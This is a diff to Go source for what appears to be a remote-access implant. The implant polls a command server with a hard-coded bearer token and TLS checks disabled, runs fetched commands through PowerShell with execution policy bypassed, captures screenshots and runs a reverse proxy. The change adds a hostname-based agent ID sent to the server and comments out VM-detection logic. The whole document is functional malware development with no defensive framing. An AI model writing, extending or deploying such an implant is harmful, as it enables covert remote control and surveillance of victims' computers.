@@ -4,10 +4,12 @@ import (
     "bufio"
     "bytes"
     "crypto/tls"
+    "crypto/rand"
     "context"
     "encoding/base64"
     "encoding/json"
     "encoding/binary"
+    "encoding/hex"
     "fmt"
     "github.com/kbinani/screenshot"
     "image/png"
@@ -25,6 +27,7 @@ import (
     "sync"
     "syscall"
     "time"
+    "unicode"
     "github.com/StackExchange/wmi"
 )
 
@@ -32,6 +35,7 @@ var (
     proxyActive   bool
     proxyStopChan chan struct{}
     proxyLock     sync.Mutex
+    agentID       string
 )
 
 var (
@@ -54,6 +58,9 @@ type CommandResult struct {
 
 func main() {
     log.Println("Agent started. Waiting for commands...")
+    agentID = getAgentID()
+    log.Printf("[*] Generated ephemeral Agent ID: %s", agentID)
+/*
     log.Println("Agent started. Checking VM status...")
 
 
@@ -84,7 +91,7 @@ func main() {
                 Result: vmResult,
         })
 
-
+*/
     ticker := time.NewTicker(10 * time.Second)
 
     go func() {
@@ -94,7 +101,7 @@ func main() {
                 isCommandRunning = true
                 mu.Unlock()
 
-                cmd, err := fetchCommand()
+                cmd, err := fetchCommand(agentID)
                 if err != nil {
                     log.Printf("Error fetching command: %v", err)
                     continue
@@ -105,7 +112,7 @@ func main() {
 
                 mu.Lock()
                 isCommandRunning = false
-            }
+        }
             mu.Unlock()
         }
     }()
@@ -113,7 +120,7 @@ func main() {
     select {} // Prevent the application from exiting immediately.
 }
 
-func fetchCommand() (Command, error) {
+func fetchCommand(agentID string) (Command, error) {
     var cmd Command
 
     req, err := http.NewRequest("GET", fmt.Sprintf("%s/command", serverURL), nil)
@@ -123,6 +130,7 @@ func fetchCommand() (Command, error) {
 
     // Add hard-coded Bearer token for authentication
     req.Header.Set("Authorization", "Bearer "+bearerToken)
+    req.Header.Set("X-Agent-ID", agentID)
 
     tr := &http.Transport{
         TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ⚠ For local testing only
@@ -172,9 +180,9 @@ func sendResult(result CommandResult) {
         return
     }
 
-    // Add hard-coded Bearer token for authentication
     req.Header.Set("Authorization", "Bearer "+bearerToken)
     req.Header.Set("Content-Type", "application/json")
+    req.Header.Set("X-Agent-ID", agentID) // use global variable here
 
     tr := &http.Transport{
         TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
@@ -420,7 +428,6 @@ func publicIp(cmd Command) {
 }
 
 func runPowerShellScript(cmd Command, scriptPath string) {
-    // Always use -File to execute scripts, with safe defaults
     command := exec.Command("powershell.exe",
         "-NoProfile",
         "-ExecutionPolicy", "Bypass",
@@ -441,7 +448,6 @@ func runPowerShellScript(cmd Command, scriptPath string) {
 }
 
 func execPowerShellAndSendResult(cmd Command) {
-    // If the Cmd already includes "powershell", strip it off to avoid recursion
     psCmd := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(cmd.Cmd), "powershell"))
     if psCmd == "" {
         psCmd = cmd.Cmd
@@ -589,7 +595,6 @@ func executeOtherCommand(cmd Command) {
     }
     sendResult(CommandResult{ID: cmd.ID, Result: resultText})
 }
-// --- VM Detection Logic (Windows only) ---
 
 
 type VMCheckResult struct {
@@ -947,5 +952,35 @@ func stopReverseProxy() {
     } else {
         log.Println("[-] proxy: not active.")
     }
+}
+
+// getAgentID builds an ephemeral ID such as "DESKTOP-123abc456def".
+func getAgentID() string {
+    host, _ := os.Hostname()
+    host = strings.Split(host, ".")[0]
+    host = sanitizeHost(host)
+    if len(host) > 15 {
+        host = host[:15]
+    }
+    randBytes := make([]byte, 8)
+    if _, err := rand.Read(randBytes); err != nil {
+        return host // fallback
+    }
+    suffix := hex.EncodeToString(randBytes)
+    return fmt.Sprintf("%s_%s", host, suffix)
+}
+
+// sanitizeHost keeps only safe ASCII chars.
+func sanitizeHost(s string) string {
+    var b strings.Builder
+    for _, r := range s {
+        if unicode.IsLetter(r) || unicode.IsDigit(r) || r == '-' || r == '_' {
+            b.WriteRune(unicode.ToLower(r))
+        }
+    }
+    if b.Len() == 0 {
+        return "host"
+    }
+    return b.String()
 }
 
